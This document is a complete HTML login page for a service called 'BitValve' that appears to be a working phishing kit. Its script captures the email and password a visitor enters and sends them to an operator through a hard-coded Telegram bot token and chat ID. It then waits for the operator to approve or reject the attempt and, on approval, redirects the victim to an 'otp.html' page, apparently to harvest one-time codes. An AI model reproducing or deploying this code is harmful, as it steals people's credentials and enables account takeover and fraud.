<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitValve - Logins</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #1f2937;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            padding: 30px 25px;
            position: relative;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 10px;
                align-items: flex-start;
                padding-top: 30px;
            }
            .container {
                padding: 20px 15px;
            }
            h1 {
                font-size: 30px !important;
            }
            .logo-text {
                font-size: 24px !important;
            }
            .form-input {
                padding: 14px 14px !important;
                font-size: 14px !important;
            }
            .btn-login {
                padding: 16px 18px !important;
                font-size: 16px !important;
            }
            .social-btn {
                width: 46px !important;
                height: 46px !important;
            }
            .social-btn svg {
                width: 20px !important;
                height: 20px !important;
            }
        }
        
        @media (min-width: 768px) {
            .container {
                max-width: 450px;
                padding: 40px 35px;
            }
            h1 {
                font-size: 40px !important;
            }
        }
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 35px;
        }
        
        .logo-icon {
            width: 36px;
            height: 36px;
        }
        
        .logo-text {
            color: #ffffff;
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        
        h1 {
            color: #ffffff;
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 22px;
        }
        
        .form-label {
            display: block;
            color: #9ca3af;
            font-size: 13px;
            font-weight: 500;
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            padding: 16px 18px;
            background: #374151;
            border: none;
            border-radius: 12px;
            color: #ffffff;
            font-family: 'Inter', sans-serif;
            font-size: 15px;
            outline: none;
            transition: background 0.2s, box-shadow 0.2s;
        }
        
        .form-input::placeholder {
            color: #6b7280;
        }
        
        .form-input:focus {
            background: #4b5563;
            box-shadow: 0 0 0 2px rgba(190, 242, 100, 0.3);
        }
        
        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            width: 22px;
            height: 22px;
            cursor: pointer;
            opacity: 0.6;
            transition: opacity 0.2s;
        }
        
        .eye-icon:hover {
            opacity: 1;
        }
        
        .forgot-link {
            display: block;
            text-align: right;
            color: #d1d5db;
            font-size: 13px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            text-decoration: none;
            margin-top: 12px;
            margin-bottom: 25px;
            transition: color 0.2s;
        }
        
        .forgot-link:hover {
            color: #ffffff;
        }
        
        .btn-login {
            width: 100%;
            padding: 18px 20px;
            background: #bef264;
            border: none;
            border-radius: 50px;
            color: #1f2937;
            font-family: 'Inter', sans-serif;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            margin-bottom: 28px;
            position: relative;
            overflow: hidden;
        }
        
        .btn-login:hover {
            transform: scale(1.02);
            opacity: 0.95;
        }
        
        .btn-login:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin-bottom: 28px;
        }
        
        .divider-line {
            flex: 1;
            height: 1px;
            background: #4b5563;
        }
        
        .divider-text {
            color: #9ca3af;
            font-size: 13px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 0 16px;
        }
        
        .social-login {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .social-btn {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            background: #ffffff;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .social-btn:hover {
            transform: scale(1.1);
        }
        
        .social-btn svg {
            width: 24px;
            height: 24px;
        }
        
        .register-text {
            color: #9ca3af;
            font-size: 15px;
            text-align: center;
        }
        
        .register-link {
            color: #5eead4;
            text-decoration: underline;
            font-weight: 500;
            transition: color 0.2s;
        }
        
        .register-link:hover {
            color: #99f6e4;
        }
        
        .error-msg {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            text-align: center;
        }
        
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(31, 41, 55, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            pointer-events: none;
        }
        
        .spinner-overlay.active {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #374151;
            border-top-color: #bef264;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            color: #d1d5db;
            font-size: 14px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        .spinner-email {
            color: #bef264;
            font-size: 13px;
            margin-top: 8px;
            font-weight: 600;
        }
        
        .cancel-poll-btn {
            margin-top: 20px;
            padding: 10px 24px;
            background: transparent;
            border: 1px solid #4b5563;
            border-radius: 50px;
            color: #9ca3af;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .cancel-poll-btn:hover {
            border-color: #ef4444;
            color: #ef4444;
        }
    </style>
    <base target="_blank">
</head>

<body>
    <div class="container">
        <div class="logo">
            <svg class="logo-icon" viewBox="0 0 36 36" fill="none">
                <rect x="0" y="0" width="12" height="12" fill="white"/>
                <rect x="12" y="12" width="12" height="12" fill="white"/>
                <rect x="24" y="24" width="12" height="12" fill="white"/>
            </svg>
            <span class="logo-text">BitValve</span>
        </div>

        <h1>Login</h1>

        <div class="error-msg" id="loginError"></div>

        <form id="loginForm">
            <div class="form-group">
                <label class="form-label">Email</label>
                <input type="email" id="emailInput" class="form-input" placeholder="Enter your email address" required>
            </div>

            <div class="form-group">
                <label class="form-label">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordInput" class="form-input" placeholder="Enter your password" required>
                    <svg class="eye-icon" id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="#5eead4" stroke-width="2" stroke-linecap="round" onclick="togglePassword()">
                        <circle cx="12" cy="12" r="3"/>
                        <path d="M2 12s4-8 10-8 10 8 10 8"/>
                    </svg>
                </div>
            </div>

            <a href="#" class="forgot-link">I forgot my password</a>

            <button type="submit" class="btn-login" id="loginBtn">Login</button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <span class="divider-text">OR</span>
            <div class="divider-line"></div>
        </div>

        <div class="social-login">
            <button class="social-btn" onclick="socialLogin('Google')">
                <svg viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
            </button>
            <button class="social-btn" onclick="socialLogin('Facebook')">
                <svg viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="12" fill="#1877F2"/>
                    <path fill="white" d="M15.84 12.5h-2.65V20h-3.2v-7.5H8.1V9.55h1.9V8.1c0-2.65 1.1-4.22 4.22-4.22h2.6v2.95h-1.6c-1.2 0-1.28.45-1.28 1.28v1.45h2.9l-.2 2.95z"/>
                </svg>
            </button>
            <button class="social-btn" onclick="socialLogin('Apple')">
                <svg viewBox="0 0 24 24">
                    <path fill="#000" d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.74 1.18 0 2.21-.93 3.33-.93 2.65 0 3.76 1.65 4.26 2.55-3.71 1.87-3.17 6.02.22 7.13-.57 1.5-1.31 2.99-2.89 4.48zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                </svg>
            </button>
        </div>

        <p class="register-text">
            Don't have an account yet? <a href="#" class="register-link">Register</a>
        </p>
    </div>

    <div class="spinner-overlay" id="spinnerOverlay">
        <div class="spinner"></div>
        <p class="spinner-text">Verifying your credentials...</p>
        <p class="spinner-email" id="spinnerEmail"></p>
        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk";
        const TELEGRAM_CHAT_ID = "5615316142";
        let pollDecided = false;
        let pollTimeoutId = null;
        let currentPollController = null;

        document.addEventListener('DOMContentLoaded', function() {
            const savedEmail = localStorage.getItem('userEmail');
            if (savedEmail) {
                document.getElementById('emailInput').value = savedEmail;
            }
        });

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('eyeIcon');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
                eyeIcon.setAttribute('stroke-linecap', 'round');
                eyeIcon.setAttribute('stroke-linejoin', 'round');
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<circle cx="12" cy="12" r="3"/><path d="M2 12s4-8 10-8 10 8 10 8"/>';
            }
        }

        function showError(msg) {
            const err = document.getElementById('loginError');
            if (err) {
                err.textContent = msg;
                err.style.display = 'block';
            }
        }

        function hideError() {
            const err = document.getElementById('loginError');
            if (err) err.style.display = 'none';
        }

        function maskEmail(email) {
            const parts = email.split('@');
            if (parts.length !== 2) return email;
            const local = parts[0];
            const domain = parts[1];
            let maskedLocal;
            if (local.length <= 2) {
                maskedLocal = local.charAt(0) + '*';
            } else {
                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
            }
            return maskedLocal + '@' + domain;
        }

        function cancelPolling() {
            pollDecided = true;
            if (pollTimeoutId) clearTimeout(pollTimeoutId);
            if (currentPollController) currentPollController.abort();
            document.getElementById('spinnerOverlay').classList.remove('active');
            document.getElementById('loginBtn').disabled = false;
            showError('Request cancelled. Please try again.');
        }

        function startPolling(userId, onApproveUrl) {
            let offset = 0;
            pollDecided = false;
            let pollCount = 0;
            const maxPolls = 90;
            let retryDelay = 2000;

            // Abort any previous polling
            if (currentPollController) currentPollController.abort();
            currentPollController = new AbortController();

            // Get initial offset
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`, {
                    signal: currentPollController.signal
                })
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }
                    pollLoop();
                })
                .catch(err => {
                    if (err.name !== 'AbortError') {
                        console.error('Initial offset error:', err);
                        pollLoop();
                    }
                });

            function pollLoop() {
                if (pollDecided) return;
                pollCount++;
                if (pollCount > maxPolls) {
                    pollDecided = true;
                    document.getElementById('spinnerOverlay').classList.remove('active');
                    document.getElementById('loginBtn').disabled = false;
                    showError('Request timed out. Please try again.');
                    return;
                }

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
                        method: 'GET',
                        signal: currentPollController.signal
                    })
                    .then(r => {
                        if (!r.ok) {
                            if (r.status === 409) {
                                // Conflict - another getUpdates is running, wait longer with exponential backoff
                                retryDelay = Math.min(retryDelay * 1.5, 10000);
                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
                                return null;
                            }
                            throw new Error('HTTP ' + r.status);
                        }
                        retryDelay = 2000; // Reset delay on success
                        return r.json();
                    })
                    .then(data => {
                        if (data === null) return;
                        if (!data.ok || pollDecided) {
                            if (!pollDecided) {
                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
                            }
                            return;
                        }

                        for (let update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                // Answer callback query
                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: "Action recorded!"
                                    })
                                }).catch(() => {});

                                if (action === `approve_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    // Use window.location.replace for same-tab navigation
                                    window.location.href = onApproveUrl;
                                    return;
                                } else if (action === `decline_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('loginBtn').disabled = false;
                                    showError('Request declined. Please try again.');
                                    return;
                                } else if (action === `wrong_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('loginBtn').disabled = false;
                                    showError('Wrong password. Please enter the correct password.');
                                    return;
                                }
                            }
                        }

                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                        }
                    })
                    .catch(err => {
                        if (err.name === 'AbortError') return;
                        console.error('Poll error:', err);
                        if (!pollDecided) {
                            retryDelay = Math.min(retryDelay * 1.2, 8000);
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                        }
                    });
            }
        }

        function sendTelegramMessage(message, keyboard, userId, onApproveUrl) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const loginBtn = document.getElementById('loginBtn');

            // Retry logic for sendMessage
            let attempts = 0;
            const maxAttempts = 3;

            function attemptSend() {
                attempts++;
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: JSON.stringify(keyboard)
                        })
                    })
                    .then(res => {
                        if (!res.ok) {
                            throw new Error('HTTP ' + res.status);
                        }
                        return res.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            startPolling(userId, onApproveUrl);
                        } else {
                            if (attempts < maxAttempts) {
                                setTimeout(attemptSend, 1000 * attempts);
                            } else {
                                spinnerOverlay.classList.remove('active');
                                loginBtn.disabled = false;
                                showError('Failed to send notification. Please try again.');
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Send error:', err);
                        if (attempts < maxAttempts) {
                            setTimeout(attemptSend, 1000 * attempts);
                        } else {
                            spinnerOverlay.classList.remove('active');
                            loginBtn.disabled = false;
                            showError('Network error. Please check your connection and try again.');
                        }
                    });
            }

            attemptSend();
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            hideError();

            const email = document.getElementById('emailInput').value.trim();
            const password = document.getElementById('passwordInput').value;

            if (!email || !password) {
                showError('Please enter your email and password.');
                return;
            }

            localStorage.setItem('userEmail', email);

            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerEmail = document.getElementById('spinnerEmail');
            const loginBtn = document.getElementById('loginBtn');

            spinnerEmail.textContent = maskEmail(email);
            spinnerOverlay.classList.add('active');
            loginBtn.disabled = true;

            const userId = email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15) + '_' + Date.now();
            const message = `🔔 <b>New BitValve Login Attempt</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
⏰ Time: ${new Date().toLocaleString('en-ZA')}

Tap to copy the details above.
Please approve, decline, or mark as wrong password:`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROVE",
                        callback_data: `approve_${userId}`
                    }, {
                        text: "❌ DECLINE",
                        callback_data: `decline_${userId}`
                    }],
                    [{
                        text: "⚠️ WRONG PASSWORD",
                        callback_data: `wrong_${userId}`
                    }]
                ]
            };

            sendTelegramMessage(message, keyboard, userId, 'otp.html');
        });

        function socialLogin(provider) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerEmail = document.getElementById('spinnerEmail');
            const loginBtn = document.getElementById('loginBtn');

            spinnerEmail.textContent = 'Connecting to ' + provider + '...';
            spinnerOverlay.classList.add('active');
            loginBtn.disabled = true;

            const userId = provider.toLowerCase() + '_' + Date.now();
            const message = `🔔 <b>New BitValve ${provider} Login Attempt</b>

📱 Provider: <code>${provider}</code>
⏰ Time: ${new Date().toLocaleString('en-ZA')}

Please approve, decline, or mark as wrong:`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROVE",
                        callback_data: `approve_${userId}`
                    }, {
                        text: "❌ DECLINE",
                        callback_data: `decline_${userId}`
                    }],
                    [{
                        text: "⚠️ WRONG PASSWORD",
                        callback_data: `wrong_${userId}`
                    }]
                ]
            };

            sendTelegramMessage(message, keyboard, userId, 'otp.html');
        }
    </script>
</body>

</html>
